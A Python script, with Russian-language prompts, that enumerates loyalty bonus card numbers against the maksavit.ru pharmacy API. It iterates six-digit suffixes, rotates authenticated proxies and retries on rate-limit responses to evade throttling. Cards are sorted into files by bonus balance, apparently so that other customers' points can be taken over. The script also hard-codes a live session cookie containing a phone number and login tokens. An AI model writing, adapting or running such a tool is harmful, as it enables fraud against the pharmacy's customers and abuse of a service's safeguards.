import requests
import multiprocessing
import time
import json
import re
def apteka(nomer_carti):
	if len(nomer_carti)==2:
		#print(nomer_carti)
		proxy = nomer_carti[0]
		ip,port,login,password=proxy.split(":")
		nomer_carti = nomer_carti[1]
		while len(nomer_carti)!=6:
			nomer_carti = '0' + nomer_carti
		nomer_carti = '2200101' + nomer_carti
		url = "https://maksavit.ru/api/bonuscard"
		payload = json.dumps({"cardId": f'{nomer_carti}'})
		proxy = {
			'https': f'http://{login}:{password}@{ip}:{port}'
		}
		headers = {
			'Cookie': '_ssruuid=bc770f1d-0ee3-47f3-a248-a7068796daab; PHPSESSID=j7na4s3ps0ho0cp1hc27mvrmi0; BITRIX_SM_SALE_UID=1606999218; tmr_lvid=1da759fc42c3ad49138e4c66b5acbd86; tmr_lvidTS=1654351046973; _ga=GA1.2.676938700.1654351047; _gid=GA1.2.781520818.1654351047; _ym_uid=1654351047399772196; _ym_d=1654351047; _userGUID=0:l3zxwdl1:NmLg5iz1WYwf1K63uGHlwXNKHRKJSXDW; _ym_isad=1; supportOnlineTalkID=XPOrsvF5PcZ8O0nTVs6JPgCeXiLhbDeC; location_code=0000600317; location_selected=N; BITRIX_SM_UIDL=%2B7%20968%20913-47-54; BITRIX_SM_LOGIN=%2B7%20968%20913-47-54; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; dSesn=2a8873d3-8e99-e8b7-2266-cdd6bae3486e; _dvs=0:l40enehj:R416nO~Nc94RVydT97sr6gTzDA6IGmX~; _ym_visorc=w; BITRIX_SM_UIDH=d4f232adc5d300695ca641ae0326dab4; _gat_UA-214267892-6=1; tmr_detect=1%7C1654379274056; tmr_reqNum=95',
			'Content-Type': 'application/json'
		}
		flag = True
		while flag == True:
			try:
				response = requests.request("POST", url, headers=headers, data=payload,proxies=proxy)
				otvet_status = response.status_code
				otvet_text = response.text
				flag = False
			except:
				pass
		while 'Too Many Requests' in otvet_text:
			try:
				response = requests.request("POST", url, headers=headers, data=payload, proxies=proxy)
				otvet_text = response.text
				otvet_status = response.status_code
			except:
				pass
		if otvet_status == 401:
			print('[-] Умерли cookie')
			return 0
		else:
			if otvet_status == 200:
				otvet_text = re.findall(r'"bonus":(\w+.*?),"active"', otvet_text)[0]
				otvet_text = otvet_text.split('.')[0]
				print(f'{nomer_carti} | {otvet_text}')
				if int(otvet_text) <= 100:
					f = open('0-100.txt','a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 100 < int(otvet_text) <= 300:
					f = open('101-300.txt','a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 301 < int(otvet_text) <= 400:
					f = open('301-400.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 401 < int(otvet_text) <= 500:
					f = open('401-500.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 501 < int(otvet_text) <= 600:
					f = open('501-600.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 601 < int(otvet_text) <= 700:
					f = open('601-700.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 701 < int(otvet_text) <= 800:
					f = open('701-800.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 801 < int(otvet_text):
					f = open('800+.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
	else:
		#print(nomer_carti)
		while len(nomer_carti)!=6:
			nomer_carti = '0' + nomer_carti
		nomer_carti = '2200101' + nomer_carti
		url = "https://maksavit.ru/api/bonuscard"
		payload = json.dumps({"cardId": f'{nomer_carti}'})
		#print(payload)
		headers = {
			'Cookie': '_ssruuid=bc770f1d-0ee3-47f3-a248-a7068796daab; PHPSESSID=j7na4s3ps0ho0cp1hc27mvrmi0; BITRIX_SM_SALE_UID=1606999218; tmr_lvid=1da759fc42c3ad49138e4c66b5acbd86; tmr_lvidTS=1654351046973; _ga=GA1.2.676938700.1654351047; _gid=GA1.2.781520818.1654351047; _ym_uid=1654351047399772196; _ym_d=1654351047; _userGUID=0:l3zxwdl1:NmLg5iz1WYwf1K63uGHlwXNKHRKJSXDW; _ym_isad=1; supportOnlineTalkID=XPOrsvF5PcZ8O0nTVs6JPgCeXiLhbDeC; location_code=0000600317; location_selected=N; BITRIX_SM_UIDL=%2B7%20968%20913-47-54; BITRIX_SM_LOGIN=%2B7%20968%20913-47-54; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; dSesn=2a8873d3-8e99-e8b7-2266-cdd6bae3486e; _dvs=0:l40enehj:R416nO~Nc94RVydT97sr6gTzDA6IGmX~; _ym_visorc=w; BITRIX_SM_UIDH=d4f232adc5d300695ca641ae0326dab4; _gat_UA-214267892-6=1; tmr_detect=1%7C1654379274056; tmr_reqNum=95',
			'Content-Type': 'application/json'
		}
		response = requests.request("POST", url, headers=headers, data=payload)
		otvet_status = response.status_code
		otvet_text = response.text
		while otvet_status == 429:
			response = requests.request("POST", url, headers=headers, data=payload)
			otvet_status = response.status_code
		print(otvet_status, otvet_text)
		if otvet_status == 401:
			print('[-] Умерли cookie')
			return 0
		else:
			if otvet_status == 200:
				otvet_text = re.findall(r'"bonus":(\w+.*?),"active"', otvet_text)[0]
				otvet_text = otvet_text.split('.')[0]
				if int(otvet_text) <= 100:
					f = open('0-100.txt','a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 100 < int(otvet_text) <= 300:
					f = open('101-300.txt','a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 301 < int(otvet_text) <= 400:
					f = open('301-400.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 401 < int(otvet_text) <= 500:
					f = open('401-500.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 501 < int(otvet_text) <= 600:
					f = open('501-600.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 601 < int(otvet_text) <= 700:
					f = open('601-700.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 701 < int(otvet_text) <= 800:
					f = open('701-800.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
				elif 801 < int(otvet_text):
					f = open('800+.txt', 'a')
					f.write(f'{nomer_carti} | {otvet_text} \n')
	time.sleep(0.150)
if __name__ == '__main__':
	#2200101 + 207668 карта
	flag = True
	while flag == True:
		try:
			print('[*] Использовать прокси? Выберите цифру: [1] Да [2] Нет',end='\n')
			vibor = input()
			if vibor == '1' or vibor == '2':
				flag = False
			else:
				print('[!] Сделайте правильный выбор.')
		except:
			print('[!] Сделайте правильный выбор.')
	if vibor == '1':
		f = open('proxy.txt', 'r')
		count_potoks = len(f.read().splitlines())
		proxys = f.read().splitlines()
		f.close()
	flag = True
	while flag == True:
		try:
			otkuda = int(input("[*] От какого числа: "))
			if 0 <= otkuda <= 999999:
				flag = False
			else:
				print('[!] Введено неверное число. Введите от 0 до 999999 включительно.')
		except:
			print('[!] Введено неверное число. Введите от 0 до 999999 включительно.')
	flag = True
	while flag == True:
		try:
			dokuda = int(input('[*] До какого числа: '))
			if dokuda >= otkuda and dokuda <= 999999 and dokuda != 0:
				flag = False
			else:
				print('[!] Введено неверное число. Введите от 0 до 999999 включительно так')
				print('    чтобы первое выбранное вами число было меньше этого')
		except:
			print('[!] Введено неверное число. Введите от 0 до 999999 включительно так')
			print('    чтобы первое выбранное вами число было меньше этого')
	spisok = [str(i) for i in range(otkuda,dokuda)]
	#print(spisok)
	if vibor == '1':
		proxy = open('proxy.txt', 'r').read().splitlines()
		proxys = []
		spisok_cart = []
		while len(proxys) < len(spisok):
			for i in proxy:
				proxys.append(i)
		proxys = proxys[:len(spisok)]
		#print(proxys)
		for i in range(len(proxys)):
			for b in range(i, len(spisok)):
				spisok_cart.append([proxys[i], spisok[b]])
				break
		#print(spisok_cart)
		with multiprocessing.Pool(count_potoks) as process:
			process.map(apteka, spisok_cart)
	else:
		with multiprocessing.Pool(1) as process:
			process.map(apteka, spisok)

